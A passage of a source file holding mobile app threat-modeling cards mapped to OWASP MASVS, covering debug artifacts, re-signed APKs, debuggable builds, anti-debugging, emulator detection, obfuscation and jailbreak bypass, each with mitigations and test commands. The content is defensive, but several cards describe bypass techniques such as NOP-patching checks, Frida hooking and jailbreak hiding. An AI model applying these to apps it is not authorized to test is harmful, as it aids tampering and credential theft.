- iOS does not allow dynamic code loading from outside the app bundle (without entitlements); this is enforced by the OS. On jailbroken devices, this restriction is lifted.
- Detect dylib injection: enumerate loaded images with `_dyld_get_image_name` and compare against expected app frameworks.

**Cryptographic Controls**
- Perform all encryption within a hardware-backed context (StrongBox / Secure Enclave) where possible to prevent pre/post-encryption hooks.
- Use sealed sender / end-to-end encryption at the application layer so that even if the transport is compromised, the plaintext is not available at intermediate points.

**Testing**
- On a rooted device, hook the encryption function with Frida and log all plaintext inputs; verify the app detects the hook.
- Replace a shared library with a modified version from a writable path; verify the app refuses to load it.
- Review all `DexClassLoader` and `ClassLoader` usage for loading from untrusted sources.

**OWASP Mappings**
- MASVS: CRYPTO-2, NETWORK-1, RESILIENCE-3, STORAGE-1
- MASTG: TEST-0001, TEST-0052
- MASWE: MASWE-0017, MASWE-0096
"""
}

CARDS["network-&-storage/NSA"] = {
"explanation": """\
## Ace: You have invented a new attack against "Network & Storage"

This card invites your team to explore novel threats against the ways your app transmits and stores data.

### What does this card ask you to do?

Invent a realistic new threat in the Network & Storage domain not already represented by NS2 through NSK. Consider:

- **New sync and cloud storage APIs:** Does the app use a new cloud-sync service, edge-sync feature, or offline-first database? What are the security guarantees of that service, and does the app rely on assumptions that are not guaranteed?
- **Encrypted network protocols:** The app uses QUIC, HTTP/3, or a custom binary protocol. Are TLS-equivalent protections applied? Are certificate validation and pinning implemented for the new protocol stack?
- **Storage at rest — novel surfaces:** Encrypted database libraries (SQLCipher, Realm with encryption), keychain/keystore access from app extensions, Watch apps, or widgets sharing the same storage — are the security properties the same in all contexts?
- **Data residency and sovereignty:** The app's storage backend changes region or provider — does this affect compliance obligations, and is the app aware of where its data is stored?

### How to play this card

1. **Nominate a threat:** One player (or the group) proposes a specific, plausible network or storage threat not covered by other NS cards.
2. **Name the attacker and victim:** What capabilities does the attacker have? What data or functionality are they targeting?
3. **Classify the threat (STRIDE):** Most network/storage attacks involve Information Disclosure or Tampering.
4. **Assess likelihood and impact:** Is this realistic for your app's threat model?
5. **Propose a mitigation:** What change reduces the risk?
6. **Score the card:** A well-formed novel threat earns full points.

### Example starting prompts

- "Our app uses a third-party SDK for offline document sync. The SDK uses its own encryption key stored in the SDK's keychain group. What if the SDK is compromised or its key management is weak?"
- "The app uses a WebSocket connection for real-time updates. The WebSocket's TLS configuration is managed by a third-party library. Is certificate pinning applied to the WebSocket connection?"
- "We recently migrated our API to a GraphQL endpoint. Are the same authentication and TLS checks applied to GraphQL introspection and batch query endpoints?"

## Threat Modeling

### STRIDE

Varies by the invented attack.

### What can go wrong?

Network and storage security controls are often applied to the "main path" but miss alternative data paths: SDKs, sync services, caches, and new protocol stacks. Novel attack paths emerge when attackers probe these secondary paths.

### What are we going to do about it?

- Validate the invented threat against the current OWASP MASTG and MASVS.
- Document the threat and the agreed mitigation in the team's threat model register.
- If genuinely novel, consider contributing to the OWASP MASVS/MASTG project.
""",
"technical_note": """\
## Guidance for Novel Network & Storage Threats

**Common areas for novel attacks**
- New transport protocols (QUIC/HTTP3, WebSockets, custom binary protocols): TLS-equivalent protection and certificate validation.
- Third-party storage SDKs (Realm, SQLCipher, Firebase): key management, backup behaviour, and data residency.
- Offline-first databases (sync conflict resolution, replication security).
- Data residency changes affecting regulatory compliance.

**Framing the attack**
- What network path or storage location does the threat exploit?
- What data is at risk and what is the impact of its disclosure or modification?

**Mapping to standards**
- MASVS: NETWORK-1, NETWORK-2, STORAGE-1, STORAGE-2, CRYPTO-2
- MASTG: consult the test catalogue for the closest existing test
- MASWE: check for an existing weakness entry

**OWASP Mappings**
- MASVS: determined by the invented threat
- MASTG: determined by the invented threat
- MASWE: determined by the invented threat
"""
}


# ─────────────────────────────────────────────────────────
# RESILIENCE (RS)
# ─────────────────────────────────────────────────────────

CARDS["resilience/RS2"] = {
"explanation": """\
## Scenario: Sebastien can disclose sensitive data or internal behaviour because debug code, verbose diagnostics, test resources, or unsafe runtime logging remain in the production app

Consider a scenario where Sebastien downloads the production release of a payment app and immediately runs `adb logcat`. Within seconds, he sees verbose debug logs: database query strings, internal state machine transitions, and a `DEBUG: Skipping cert validation for test` message indicating that a certificate-validation override was left in the production binary. The developer had a deadline and promoted the debug build to production. Nobody noticed until Sebastien did.

1. Debug log statements that print internal state, queries, and flags are readable via ADB or on jailbroken devices.
2. Test credentials, hardcoded bypass flags, and diagnostic endpoints left in production create exploitable shortcuts.
3. Verbose error messages that reveal stack traces, class names, or internal queries assist an attacker in understanding the app's architecture.

### Example

Sebastien finds a `BuildConfig.DEBUG = true` reference in the production APK's string constants. He decompiles the app with jadx and finds a branch that, when `DEBUG == true`, skips certificate pinning validation. He confirms this by observing that Burp Suite intercepts app traffic without certificate errors in the "production" build. The release build was compiled with `debug` variant by mistake. It shipped to 200,000 users.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure** and **Elevation of Privilege**.

Debug artifacts expose internal details that reduce an attacker's reconnaissance effort and may include security bypasses that directly elevate privileges.

### What can go wrong?

- Certificate validation bypasses left in production allow MITM attacks.
- Debug flags enable hidden admin panels or test accounts.
- Verbose logs expose session tokens, database queries, and internal state to ADB or crash-reporting services.
- Test credentials in the binary allow authentication without valid user credentials.

### What are we going to do about it?

- Use build variants strictly: all debug-only code behind `if (BuildConfig.DEBUG)` guards; release builds must use the release variant.
- Remove all `Log.d`, `Log.v`, and equivalent verbose logs from release builds via ProGuard strip rules.
- Audit the production APK/IPA for debug symbols, test credentials, hardcoded bypass flags, and debug endpoints.
- Include a "debug artifact removal" step in the release checklist and automate it with static analysis.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- ProGuard/R8: `-assumenosideeffects class android.util.Log { public static *** d(...); public static *** v(...); }` strips debug/verbose log calls.
- `BuildConfig.DEBUG`: ensure the release build has `DEBUG = false`; verify in the APK's `BuildConfig.class`.
- MobSF static analysis: check "Hardcoded Secrets" and "Debug Mode Enabled" findings.
- Remove test activities, test broadcast receivers, and diagnostic endpoints from the release manifest.

**iOS**
- `DEBUG` conditional compilation: `#if DEBUG ... #endif` for any code that should not appear in release builds.
- `os_log` with `.debug` level is not included in archived logs from non-development devices, but `print()` and `NSLog()` are always active — replace with `os_log` at appropriate levels.
- Archive and export the release IPA; run `strings` on the binary to check for hardcoded test credentials or debug flags.

**Testing**
- Run `adb logcat` against the production release build during normal usage; verify no sensitive data or debug output appears.
- Decompile the APK with jadx and search for `BuildConfig.DEBUG`, `"debug"`, `"test"` string constants.
- Review the production binary for debug symbols: `nm -a YourApp | grep -i debug`.

**OWASP Mappings**
- MASVS: RESILIENCE-3
- MASTG: TEST-0041, TEST-0084, TEST-0263, TEST-0264, TEST-0265, TEST-0358, TEST-0359
- MASWE: MASWE-0094, MASWE-0095
"""
}

CARDS["resilience/RS3"] = {
"explanation": """\
## Scenario: Tobias can disclose sensitive data and implementation details because debug symbols and other non-production metadata remain available in the release binary

Consider a scenario where Tobias downloads the production APK and decompiles it with jadx. He finds fully qualified class names, method names, and variable names that were not obfuscated — because the release build did not have ProGuard/R8 configured. He also finds a `debug_symbols/` directory in the APK's assets containing the `.pdb` files for the native library, which map function addresses to source-level symbols. Within an hour, Tobias has a near-complete map of the app's internal architecture.

1. Debug symbols in native binaries expose function names, source file paths, and sometimes local variable names.
2. Non-obfuscated Java/Kotlin bytecode exposes class and method structure, making reverse engineering significantly faster.
3. Embedded source maps or `.d` files can reveal source file paths, developer workstation paths, and internal component names.

### Example

Tobias decompiles the native library and finds symbol entries like `com.target.app.internal.AuthTokenManager.getStoredToken()` and `com.target.app.internal.CryptoHelper.generateMasterKey()`. These names, combined with the decompiled bytecode, reduce the reverse engineering effort from weeks to hours. He quickly identifies the key-derivation function's structure and crafts an offline attack. The developer had left debug symbols in because "nobody will bother reversing it." Tobias was sufficiently motivated.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

Debug symbols and non-obfuscated metadata disclose the app's internal architecture to an attacker, significantly reducing the effort required to identify vulnerabilities, reverse-engineer proprietary algorithms, or craft targeted attacks.

### What can go wrong?

- Internal class and method names reveal the app's architecture and proprietary logic.
- Function symbols in native binaries help attackers identify attack surfaces without dynamic analysis.
- Source file paths embedded in debug metadata reveal internal project structure and potentially sensitive information.

### What are we going to do about it?

- Enable ProGuard/R8 in all release builds (`minifyEnabled true`, `shrinkResources true`).
- Strip debug symbols from native `.so` files before packaging: `llvm-strip --strip-debug lib.so`.
- Remove all `.pdb`, `.dSYM`, and symbol-map files from the release artifact.
- Verify the release APK/IPA is properly obfuscated before distribution: decompile a sample and check for meaningful class/method names.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- `build.gradle`: `buildTypes { release { minifyEnabled true; proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro' } }`
- Strip native symbols: in `CMakeLists.txt`, set `CMAKE_BUILD_TYPE=Release`; or use `llvm-strip --strip-all`.
- Verify obfuscation: `jadx app-release.apk` — class names should appear as `a`, `b`, `c` etc. for obfuscated code.
- Remove assets bundled debug symbol files: grep the APK for `.pdb`, `.dSYM`, `.map` files.

**iOS**
- Export the app with the "Strip Debug Symbols During Copy" Xcode setting enabled.
- dSYM files are generated for crash symbolication but should NOT be included in the distributed IPA; they are stored separately.
- Verify: `nm -a YourApp.app/YourApp | grep -v "^U"` — strip-debug should reduce symbols significantly.
- Swift type metadata may still reveal some structure in release builds; consider obfuscation tools for high-risk apps.

**Testing**
- Decompile the release APK/IPA and verify class names are meaningless after obfuscation.
- Run `strings` on native binaries and verify no function names or source paths are visible.
- Check the APK's assets directory for accidentally bundled symbol files.

**OWASP Mappings**
- MASVS: RESILIENCE-3
- MASTG: TEST-0040, TEST-0083, TEST-0219, TEST-0288
- MASWE: MASWE-0093
"""
}

CARDS["resilience/RS4"] = {
"explanation": """\
## Scenario: Timur can replace or redistribute the production app because its signature, certificate, store origin, or packaged-code integrity is not properly verified

Consider a scenario where Timur downloads the target app's APK from a third-party website, modifies it to add a keylogger, re-signs it with his own certificate, and distributes the modified APK on app-sharing forums as "the official app with premium features unlocked." Users who sideload the modified APK receive a functional copy of the app — along with the keylogger. The app does not verify its own certificate or signing identity at runtime.

1. APKs distributed outside the official store can be modified and re-signed by anyone.
2. Apps that do not verify their signing certificate at runtime cannot detect that they are running as a modified copy.
3. The official store is the first line of defence; sideloading bypasses all store-level security checks.

### Example

Timur modifies the APK's `classes.dex` to add a small hook that copies every password entered into a background service. He re-signs with his own debug certificate. The modified APK is functionally identical to the original. Users who install it never notice. The app's code does not verify the signing certificate; it runs happily under any signing key. The banking app now reports every credential to Timur's server. The feature set is identical. The keylogger is free.

## Threat Modeling

### STRIDE

This scenario falls under **Tampering** and **Spoofing**.

Timur distributes a modified version of the legitimate app that masquerades as the original, tampers with the app's code to introduce malicious functionality, and spoofs the user experience of the real app.

### What can go wrong?

- Users install a modified app thinking it is the official version.
- Malicious code is injected into the app (keyloggers, credential stealers, ad fraud).
- The modified app accesses the legitimate backend using the user's credentials, making the attack invisible.

### What are we going to do about it?

- Verify the app's signing certificate at runtime and terminate if it does not match the expected value.
- Use Google Play Integrity API (Android) or App Attest (iOS) to attest that the app is the official, unmodified version installed from the official store.
- Educate users to install only from official stores; include a deep link to the official listing.
- Monitor for fraudulent or modified versions of the app on unofficial channels using brand-protection services.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Runtime certificate check:
  ```kotlin
  val info = packageManager.getPackageInfo(packageName, PackageManager.GET_SIGNATURES)
  val cert = info.signatures[0].toCharsString()
  // Compare against expected signing certificate hash
  ```
- Google Play Integrity API: `integrityManager.requestIntegrityToken()` returns a verdict including `APP_RECOGNITION_VERDICT`; verify `PLAY_RECOGNIZED` server-side.
- `android:installLocation="internalOnly"` prevents installation to SD card, reducing the risk of APK extraction.

**iOS**
- App Attest (`DCAppAttestService`): `attestKey(keyId:clientDataHash:completion:)` produces an attestation that Apple verifies; use it to confirm the app is an unmodified App Store build.
- The App Store code signature is enforced by the OS on non-jailbroken devices; jailbroken device detection is a defence-in-depth.

**Testing**
- Modify the APK (e.g., add a log statement), re-sign with a debug key, and install; verify the app detects the invalid signature and refuses to run.
- Test the Play Integrity API response handling for each verdict category.

**OWASP Mappings**
- MASVS: RESILIENCE-2
- MASTG: TEST-0038, TEST-0081, TEST-0220, TEST-0224, TEST-0225
- MASWE: MASWE-0104, MASWE-0106
"""
}

CARDS["resilience/RS5"] = {
"explanation": """\
## Scenario: Matteo can bypass access controls and trigger functionality because debugging is left enabled in the production build

Consider a scenario where Matteo connects a device running the production app to his computer and uses ADB to attach a debugger. The production APK has `android:debuggable="true"` in its manifest. Matteo sets breakpoints in the authentication flow, inspects memory at the point where the session key is decrypted, and reads the plaintext key. He could also modify the execution flow to bypass the authentication check entirely. The production app was debuggable. The developer had not noticed.

1. `android:debuggable="true"` allows ADB debugger attachment to the app process, enabling memory inspection and execution control.
2. On iOS, production apps should not be signed with development certificates that enable debugger attachment.
3. Debug build features (admin menus, hidden flags) enabled by debuggable mode create additional attack vectors.

### Example

Matteo attaches `jdb` to the app process. He sets a breakpoint at the `decrypt()` method call and, when it is hit, inspects the local variable `key` — a raw byte array containing the decrypted AES key. He copies the key. He can now decrypt all of the user's locally stored data offline, without needing the device's PIN. The app was only debuggable because a CI pipeline step had incorrectly promoted the debug build artifact to the production release channel.

## Threat Modeling

### STRIDE

This scenario falls under **Elevation of Privilege** and **Information Disclosure**.

A debuggable production app allows any user with ADB access to inspect memory, modify execution flow, and bypass security controls — effectively granting them the ability to act as a developer with full process visibility.

### What can go wrong?

- Memory inspection at runtime reveals decrypted keys, tokens, and PII.
- Execution flow modification bypasses authentication, authorization, and integrity checks.
- Hidden debug menus or admin features, accessible only in debug mode, are activated.
- Production users can attach debuggers to the app, removing the privacy boundary between the OS and the app process.

### What are we going to do about it?

- Ensure release builds never have `android:debuggable="true"`; this attribute is absent or `false` in the release manifest by default if the build system is configured correctly.
- Verify programmatically at runtime: `ApplicationInfo.FLAG_DEBUGGABLE` should not be set; terminate or restrict functionality if it is.
- On iOS, ship only with production signing certificates; App Store distribution enforces this.
- Include a manifest debuggability check in the automated release process.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- `android:debuggable="true"` must not appear in release `AndroidManifest.xml`. ProGuard/R8 build types set it to `false` by default.
- Runtime check:
  ```kotlin
  val isDebuggable = applicationInfo.flags and ApplicationInfo.FLAG_DEBUGGABLE != 0
  if (isDebuggable) { /* terminate or restrict */ }
  ```
- Verify in CI: `aapt dump badging app-release.apk | grep debuggable` should return nothing or `false`.
- ADB daemon attaches to debuggable apps without root; verify `adb jdwp` does not list your app's process in a release build.

**iOS**
- Production builds signed with App Store distribution certificate cannot be debugged with lldb without a provisioning profile override.
- Detect debugger attachment at runtime:
  ```swift
  var info = kinfo_proc(); var size = MemoryLayout.stride(ofValue: info)
  var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()]
  sysctl(&mib, 4, &info, &size, nil, 0)
  let isBeingDebugged = (info.kp_proc.p_flag & P_TRACED) != 0
  ```
- Anti-debugging checks are a defence-in-depth measure; hardware-backed key protection is the primary control.

**Testing**
- Run `adb jdwp` while the production app is running; verify no PID is listed.
- Attempt `jdb -attach localhost:$(adb jdwp | head -1)` on the production app; verify it fails.
- Verify `aapt dump badging release.apk | grep debuggable` shows no debuggable flag.

**OWASP Mappings**
- MASVS: PLATFORM-2, RESILIENCE-3, RESILIENCE-4
- MASTG: TEST-0039, TEST-0082, TEST-0226, TEST-0227, TEST-0261
- MASWE: MASWE-0067, MASWE-0074, MASWE-0095
"""
}

CARDS["resilience/RS6"] = {
"explanation": """\
## Scenario: Joren can bypass access controls because the anti-debugging controls are not strong enough according to what is recommended or the perceived effort of a potential attacker

Consider a scenario where Joren is examining a high-value financial app. The app has basic anti-debugging checks — it calls `isDebuggerConnected()` and `ptrace(PT_DENY_ATTACH)`. Joren patches both checks with a binary editor: he replaces the branch instruction after `isDebuggerConnected()` with a NOP and replaces the `ptrace` syscall with a NOP. Both anti-debugging checks are defeated in under five minutes using a hex editor. The app now runs under a debugger with full visibility.

1. Single-layer, easily-patchable anti-debugging checks do not deter determined attackers.
2. Checks implemented as single conditional branches are trivially NOP-patched.
3. Anti-debugging checks that do not take effect until after app startup can be bypassed by attaching a debugger before the check runs.

### Example

Joren attaches a debugger to the running app process before the anti-debugging check is reached in the execution flow. The check runs, detects the debugger, and calls `exit()`. Joren patches the `exit()` call to a NOP using a dynamic instrumentation tool. The anti-debugging check now calls `exit()` into a NOP and continues normally. Joren now has full debugger visibility into the app. The anti-debugging check was cosmetic.

## Threat Modeling

### STRIDE

This scenario falls under **Elevation of Privilege**.

Bypassing anti-debugging controls gives Joren the ability to inspect memory, modify execution flow, and extract sensitive data — capabilities that the anti-debugging controls were intended to prevent.

### What can go wrong?

- Cryptographic keys and decrypted data are visible in memory under a debugger.
- Authentication and authorization logic is modified at runtime to bypass security controls.
- Proprietary algorithms and business logic are exposed through full execution visibility.
- Anti-debugging checks that can be trivially patched provide only the illusion of protection.

### What are we going to do about it?

- Implement multiple, diverse anti-debugging checks at different call sites and code paths, making comprehensive patching more difficult.
- Detect the debugger at multiple points: startup, before sensitive operations, and periodically during the session.
- Combine anti-debugging with integrity checks: if any check is modified (NOP'd), the integrity hash changes, triggering a secondary response.
- Use cryptographic controls as the primary protection; anti-debugging is a defence-in-depth measure that raises the cost of attack but cannot be made absolute.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Multiple detection methods: `Debug.isDebuggerConnected()`, `android.os.Debug.waitingForDebugger()`, `/proc/self/status TracerPid`, ptrace self-attachment.
- Distribute checks throughout the codebase; do not consolidate all checks in one easily bypassed function.
- Native anti-debugging: call `ptrace(PT_TRACE_ME, 0, 0, 0)` in a `.init_array` function to prevent any other debugger from attaching.
- Response strategy: failing an anti-debugging check should not `exit()` immediately (easily NOP-patched); use a delayed, obfuscated response (corrupt a key, navigate to an error state after a delay).

**iOS**
- `ptrace(PT_DENY_ATTACH, 0, 0, 0)` in a constructor: prevents debugger attachment after the call.
- sysctl check: see RS5 technical note — check `P_TRACED` flag.
- Detect Frida/Substrate: scan `_dyld_get_image_name` for known hooking library paths.

**Perspective on effectiveness**
- No anti-debugging control is defeat-proof against a sufficiently motivated attacker with physical device access.
- The goal is to raise the cost of attack to a level that exceeds the value of the target.
- Document the threat model and the acceptable effort threshold when designing resilience controls.

**Testing**
- Attempt to NOP-patch each anti-debugging check individually using a binary editor; verify that other checks trigger a response.
- Use Frida to hook each anti-debugging detection function; verify the app detects the hook or responds appropriately.

**OWASP Mappings**
- MASVS: RESILIENCE-4
- MASTG: TEST-0046, TEST-0089, TEST-0352, TEST-0353, TEST-0401, TEST-0402
- MASWE: MASWE-0101
"""
}

CARDS["resilience/RS7"] = {
"explanation": """\
## Scenario: Erlend can compromise the app by running it in an emulator, simulator, virtualized environment, or untrusted device because environment detection and attestation are absent or too weak

Consider a scenario where Erlend runs the target banking app in an Android emulator to automate credential stuffing attacks. The app does not detect emulator environments and does not require device attestation. Erlend runs thousands of login attempts per hour from the emulator, automating the attack at scale that would be impossible on a physical device. The server-side rate limiting is per-IP; Erlend rotates IPs via a proxy. The emulator environment was the enabler.

1. Emulators allow scripted, high-speed interaction without physical device limitations, enabling automation attacks.
2. Virtual environments may have different sensor behaviour, clock characteristics, and hardware identifiers that reveal the non-physical nature.
3. Apps without device attestation cannot distinguish legitimate physical-device users from automated emulator-based attackers.

### Example

Erlend sets up an Android emulator farm. He notes that the banking app's login flow does not implement any emulator detection or device attestation requirement. He writes an Appium script that automates credential stuffing using a list of breached username/password combinations. The emulator environment enables 500 attempts per minute per instance. The app's rate limiting was applied at the user account level, not the device level. The attack runs undetected for 48 hours, compromising 1,200 accounts. The bank discovers it when customers start calling about unauthorised transactions.

## Threat Modeling

### STRIDE

This scenario falls under **Spoofing** (masquerading as a legitimate device) and **Elevation of Privilege** (bypassing device-level rate limiting and attestation).

Emulator-based attacks allow an attacker to impersonate many legitimate users at scale, exploiting the absence of device-level identity verification.

### What can go wrong?

- Credential stuffing attacks run at machine speed from emulators.
- Bots automate in-app fraud (account creation, bonus abuse, payment fraud) at scale.
- Sensitive reverse engineering is performed in a controlled virtual environment without hardware-based detection.

### What are we going to do about it?

- Implement emulator detection heuristics: check hardware identifiers, sensor availability, build properties (`android.os.Build.FINGERPRINT`, `ro.kernel.qemu`), and network characteristics.
- Use hardware attestation (Google Play Integrity API / Apple App Attest) to verify the device is a genuine, unmodified physical device.
- Apply device-level rate limiting on the server side in addition to account-level limits.
- Treat attestation failure as a risk signal; escalate to additional verification rather than blanket rejection to avoid false positives for legitimate emulator-based QA.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Emulator heuristics: check `Build.FINGERPRINT.startsWith("generic")`, `Build.PRODUCT` contains "sdk", `Build.HARDWARE` contains "goldfish" or "ranchu", IMEI is all zeros.
- Sensor availability: emulators often lack real sensor data (accelerometer, gyroscope near-zero values, no battery variation).
- Google Play Integrity API: `MEETS_DEVICE_INTEGRITY` verdict indicates a physical, certified Android device; `MEETS_VIRTUAL_INTEGRITY` indicates a virtual environment.
- Combine heuristics with server-side attestation for higher confidence.

**iOS**
- Simulators: `TARGET_OS_SIMULATOR` compile-time flag identifies the iOS Simulator (Xcode only, not a threat model concern for production).
- Jailbroken devices are a more relevant threat than simulators on iOS for production apps.
- App Attest: validates the device is a genuine Apple device; attestation tokens are verified server-side via Apple's attestation service.

**Note on false positives**
- Emulator detection heuristics can produce false positives on legitimate testing devices or virtual machines used by enterprise MDM.
- Document acceptable false-positive rates and have a manual review path for edge cases.

**Testing**
- Run the app in the Android Emulator and verify the detection mechanism identifies the virtual environment.
- Test the Play Integrity API response handling for virtual environment verdicts.

**OWASP Mappings**
- MASVS: RESILIENCE-1
- MASTG: TEST-0049, TEST-0092, TEST-0351, TEST-0367
- MASWE: MASWE-0098, MASWE-0099
"""
}

CARDS["resilience/RS8"] = {
"explanation": """\
## Scenario: Carlos can reverse engineer the app with static analysis and decompilation tools because anti-analysis controls are not strong enough for the app's risk and attacker model

Consider a scenario where Carlos downloads the production APK, opens it in jadx, and within thirty minutes has a reasonably complete understanding of the app's authentication logic, API endpoints, and key-derivation function. The code was not obfuscated — the developer had intended to add ProGuard but never did. Carlos identifies a hardcoded API key in a constants class, a predictable session token format, and a weak key-derivation function. All of this was discoverable through static analysis without running the app at all.

1. Unobfuscated code exposes class names, method logic, and string constants, reducing reverse-engineering effort dramatically.
2. Hardcoded secrets (API keys, symmetric keys, backend URLs) are trivially extractable from static analysis.
3. Proprietary business logic, anti-fraud algorithms, and security-relevant code paths are exposed to competitors and attackers.

### Example

Carlos decompiles the banking app and finds the class `com.target.app.security.AuthHelper` with a method `generateSessionToken(userId)` that concatenates the user ID with a hardcoded salt and Base64-encodes the result. He reverse-engineers the algorithm, generates valid session tokens for arbitrary user IDs, and presents them to the API. The "token generation" was security through obscurity, and the obscurity lasted about 45 minutes.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

Static reverse engineering exposes the app's internal logic, secrets, and security mechanisms, enabling an attacker to craft targeted attacks without any dynamic interaction with the app.

### What can go wrong?

- Hardcoded secrets (API keys, cryptographic keys, backend credentials) are extracted and misused.
- Proprietary algorithms are reverse-engineered and replicated or attacked offline.
- Security controls are analysed to find bypasses before any network interaction occurs.
- Competitor apps replicate proprietary business logic from the decompiled source.

### What are we going to do about it?

- Enable ProGuard/R8 with aggressive obfuscation in release builds.
- Never hardcode secrets in the app binary; use remote configuration, the keystore, or secure secret storage.
- Apply string obfuscation to sensitive string constants (API endpoints, algorithm identifiers).
- For high-value apps, consider native code for security-critical logic to increase the cost of static analysis.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Enable `minifyEnabled true` and configure comprehensive ProGuard rules.
- Add string encryption for hardcoded secrets using a ProGuard-compatible string-obfuscation library.
- Move security-critical logic to native code compiled with symbol stripping.
- Static analysis of the release APK: decompile with jadx and review any remaining readable class names or string constants.

**iOS**
- Swift binaries retain some type metadata even in release builds; this is a known limitation.
- LLVM obfuscation passes (e.g., Hikari/LLVM-Obfuscator) can be applied for high-security apps.
- `strings YourApp.app/YourApp | grep -i "api\|key\|secret\|token"` — verify no sensitive strings are readable from the binary.

**All Platforms**
- The primary defence against credential extraction is not to put secrets in the binary in the first place.
- Anti-analysis controls (obfuscation, string encryption) raise the cost of reverse engineering but cannot be made absolute.
- Document the threat model and the acceptable effort threshold.

**OWASP Mappings**
- MASVS: RESILIENCE-3, RESILIENCE-4
- MASTG: TEST-0048, TEST-0091
- MASWE: MASWE-0092
"""
}

CARDS["resilience/RS9"] = {
"explanation": """\
## Scenario: Sean can reverse engineer the app because the code obfuscation is not strong enough according to what is recommended or the perceived effort of a potential attacker

Consider a scenario where Sean encounters a financial app that has ProGuard enabled, but only with the default configuration. The default ProGuard rules rename classes to `a`, `b`, `c` but do not obfuscate string literals, do not apply control-flow obfuscation, and leave all Android framework subclass names intact. Sean can trace the control flow from the entry points (named Activities) through to the internal logic using the decompiled class structure, even with the default name mangling.

1. Default ProGuard configuration without additional hardening leaves significant structure visible in decompiled code.
2. String literals (API endpoints, algorithm names, error messages) provide a roadmap through the obfuscated code.
3. Reflection-based code and dynamically loaded classes may be exempt from obfuscation.

### Example

Sean decompiles the obfuscated APK. He cannot read class names, but he can find string constants: `"https://api.target.com/v2/auth"`, `"AES/CBC/PKCS5Padding"`, `"******"` (a JWT header). These strings, combined with the class structure visible from Activity/Fragment base class names, give him enough context to map the authentication flow. He identifies the JWT signing secret — also a hardcoded string — in under an hour. The obfuscation slowed him down by about twenty minutes.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

Insufficient obfuscation leaves the app's security-relevant logic, secrets, and control flow visible to static analysis, reducing the time and skill required to reverse-engineer the app and identify exploitable vulnerabilities.

### What can go wrong?

- JWT signing secrets, API keys, and algorithm identifiers are visible as string constants.
- Recognizable control-flow patterns (login, payment processing) are identified and analysed.
- Anti-tamper and anti-debugging logic is located and NOP-patched using the visible structure.

### What are we going to do about it?

- Apply string obfuscation to all security-sensitive string constants, not just class names.
- Use control-flow obfuscation to make decompiled code less readable.
- Remove hardcoded secrets from the binary entirely; fetch them from a secure remote source or derive them from hardware-bound material.
- Test the obfuscation effectiveness by decompiling the release build and assessing readability against the app's threat model.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Default ProGuard: renames identifiers but does not obfuscate strings or control flow.
- String obfuscation: use a library such as StringFog, DexGuard (commercial), or implement a custom annotation processor.
- Add ProGuard rules to remove debug log calls, retain required framework class names, and apply aggressive optimisation.
- Control flow obfuscation: R8 applies some optimisations; commercial tools (DexGuard, iXGuard) apply stronger transformations.
- Verify obfuscation: run `jadx --no-debug-info release.apk` and review the result for readable security logic.

**iOS**
- LLVM-based obfuscation passes can be applied as a build step.
- Swift and Objective-C type metadata is partially visible in release builds; this is a platform limitation.
- Strip all debug symbols and export maps from the release build.
- `strings YourApp | grep -E "^[A-Za-z0-9+/]{20,}"` — check for unobfuscated Base64-encoded secrets.

**Effectiveness Assessment**
- Obfuscation raises the cost of reverse engineering but cannot make it impossible.
- The appropriate obfuscation strength depends on the value of the protected assets and the likely attacker's capability.
- For high-value assets, combine obfuscation with hardware-backed key storage so that the secret is never in the binary.

**OWASP Mappings**
- MASVS: RESILIENCE-3
- MASTG: TEST-0051, TEST-0093, TEST-0368, TEST-0369, TEST-0391
- MASWE: MASWE-0089, MASWE-0090, MASWE-0091
"""
}

CARDS["resilience/RSX"] = {
"explanation": """\
## Scenario: Juan can bypass jailbreak and root detection, execute administrative functions, bypass integrity checks, and access controls and trigger app functionality

Consider a scenario where Juan has a jailbroken iPhone with Shadowrocket and a Cydia tweak installed. The banking app's jailbreak detection checks for the presence of Cydia's application bundle and the writability of `/private/`. Juan uses a jailbreak-hiding tool (Liberty Lite, A-Bypass) that intercepts the file-existence and file-system-write calls and returns "not found" / "failed" for the jailbreak indicators. The app's detection logic sees a clean device. Juan now has a fully functional banking app running on a jailbroken device where his other tools have root-level access to the process.

1. Jailbreak/root detection based solely on file-existence checks is trivially bypassed by jailbreak-hiding tools.
2. Single-layer detection that checks one set of indicators is bypassed by tools that specifically target those indicators.
3. On rooted Android, `su` binaries, build properties, and system app modifications reveal root; all can be hidden by a sufficiently motivated attacker.

### Example

Juan uses A-Bypass to hide the jailbreak indicators from the banking app. The app opens normally. Juan then uses Frida, running on the same jailbroken device, to hook the app's balance-display function and read the decrypted account balance without any additional authentication. The app's cryptographic protections use software-only checks — they can be bypassed once the process is accessible under Frida. Juan now has direct access to the app's decrypted state. The jailbreak detection was defeated before the cryptographic protection was challenged.

## Threat Modeling

### STRIDE

This scenario falls under **Elevation of Privilege**.

Bypassing jailbreak/root detection gives Juan access to a privileged execution environment from which he can use OS-level and process-level tools that the app's security model assumes are not available.

### What can go wrong?

- Cryptographic keys are extracted from memory using root/jailbreak access.
- App data is accessed directly from the filesystem using root-level file access.
- Authentication and integrity checks are bypassed using Frida/Cycript/LLDB.
- The assumption that "the device is trusted" that underlies many app security controls is invalidated.

### What are we going to do about it?

- Implement multiple, diverse detection mechanisms for root/jailbreak: file existence, API behaviour checks, library injection detection, native system-call probes.
- Combine detection with hardware-backed cryptography: even if detection is bypassed, keys stored in the Secure Enclave / StrongBox are not extractable.
- Respond to detection with a risk signal to the server: escalate to additional verification rather than immediate termination (which can be patched).
- Clearly document in the app's threat model what the acceptable risk level is for jailbroken devices, and design security controls accordingly.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android (Root Detection)**
